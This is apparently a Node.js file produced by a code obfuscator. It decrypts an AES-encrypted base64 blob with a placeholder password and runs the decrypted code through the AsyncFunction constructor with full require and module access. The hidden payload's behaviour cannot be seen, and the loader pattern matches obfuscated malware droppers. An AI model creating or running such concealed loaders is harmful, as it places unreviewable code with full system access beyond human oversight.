// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 3.0.0                                     ║
// ║  Encrypted: 2026-03-19 08:27:17 UTC                   ║
// ║  Cipher   : AES-256-GCM                               ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v3.0.0
(async () => {
  if (typeof require === 'undefined') {
    throw new Error('[Obfuscationary] Browser mode not supported for multi-layer. Use Node.js.');
  }

  const _b64            = 'YoJF0DAkB+Bty4gB4wrAxWrK1BzlwuvYS8q0AEuG7g+PjMC4w/cVzxoRI8q8qQpadRZCXEMUUm6WtVJVQg+gWuFiq8TwXX5iIFMNxKteqn1uCiD1WZEIPgtf7AfGYg0B/jQleGzpfsaDV4ltBqtXm0TVUmFaZCGGKVB7B0ie99PEoWUCHRnH8D2T7YER0SrL7dDfEJE4knyj3lZHvLap0StYYy0+maYJOum6MbMZqWvcXQnoGiFyQGrEk49f5zghK9oG/Kz78i63sFmYGhQEHp8gFDHjhtTYypoVVac2exbdDD7/tcJiqLtPS/VidcyLVhzVWxtV33n8RP8WVMr5sArRVp5HWmOOdjSCiyXWOs8lkPc1CXOvDbnEoysWRGNksnM8ZoHHTehO9fRrjThhZmc3TF4uYvZJzOIp7pNB0TNpDt6IBE0RXQIM3S1E0aF9xhghW5BrluwOGqwHeIiUwngIeaTAOqUDb9If3nZWfE6BKBiYcCzNq43L7DLaXbELZ1gA+TGilvuuVu7btp7/CgHSvD+jc6ITqHuRXeGhGsX1VbkMUyVxTlOZ5QrPSf5BkmCCObFHHyYQCiRERdlo+ebt9/uzTioHuZZFrLXYXIXOODtjH3h1IvJLrS90EWVeBpXjLSl4P25RJlt4hXlBgXqmZgHKnpM5FVZyf+qfaqeUKrYumA+D66qvrLCWBIv29q4WEK3UlBkHnC/22Au9G1y9nSDHPMLz2K0lNvK6ZbYP413iuAuxrf6neT2km+hS2XTIk1BzXtYknhriXAYNrxpKzAr6TBDq6QfGT2CPEzOi0ZNSK+SnidE+C6mqsuh2ekeIR22PxfKM7dkrtOgXLFC2t3ldCSuPDfNyon+JotowZWsqsZrhKVbAd4+IwmF/CUT2eDW9iXv89LlzRIiYoySg78ZzcdkgilzhGp8loy6mPY+HkDMhyuceAltO8qh94aab4ZUI/1j/BzI7N+y0k3lM4sydETO2Sjh0KJakcKKeXja4uhKpsWvxPKvKTYNyvSVSEVzu5jxHMvPx3QJxaRSJV7DoyYFlsTr+p4y93Hwg2EzwF1Xv/iAWvVZ/SOviR+6bc1qzMcQnb9nBOphZcVi/SmHdunJ/G+OHYYUOGXm7QPbLwEDaseI0gJ4xTDA2nWp9QYNZMsKscxXReRandaZKLv4WZThbKsiRFHck49UBSug6QvOeMidfzrttolUOO/Wnihxi5qt/ThvmA8eJwKvkIYsfL06LcIbpCY4Borbf9alf+1B1sw9RH/iL';
  const _INTEGRITY_HASH = 'e9de005b58afc9613aa0a7bf5b0bf20f4a398edfc28a670cdc21910b7f428aa2';
  let   _src;

  const _PWDS  = ["change_me_to_a_strong_password"];
  const _ITERS = 600000;

  // Integrity check
  const _crypto2 = require('crypto');
  const _actualHash = _crypto2.createHash('sha256').update(_b64).digest('hex');
  if (_actualHash !== _INTEGRITY_HASH) {
    throw new Error('[Obfuscationary] Tamper detected! File integrity check failed.');
  }

  // Multi-layer decrypt (reverse order)
  let _data = Buffer.from(_b64, 'base64');
  for (let _i = _PWDS.length - 1; _i >= 0; _i--) {
    const _pw   = _PWDS[_i];
    const _salt = _data.slice(0, 16);
    const _iv2  = _data.slice(16, 28);
    const _ct2  = _data.slice(28);
    const _ctag2 = _ct2.slice(_ct2.length - 16);
    const _cdat2 = _ct2.slice(0, _ct2.length - 16);
    const _key2  = _crypto2.pbkdf2Sync(_pw, _salt, _ITERS, 32, 'sha256');
    const _dec2  = _crypto2.createDecipheriv('aes-256-gcm', _key2, _iv2);
    _dec2.setAuthTag(_ctag2);
    _data = Buffer.concat([_dec2.update(_cdat2), _dec2.final()]);
  }
  _src = _data.toString('utf8');

  const _Fn = Object.getPrototypeOf(async function(){}).constructor;
  await _Fn('module', 'exports', 'require', '__filename', '__dirname', _src)(
    module, exports, require, __filename, __dirname
  );
})();
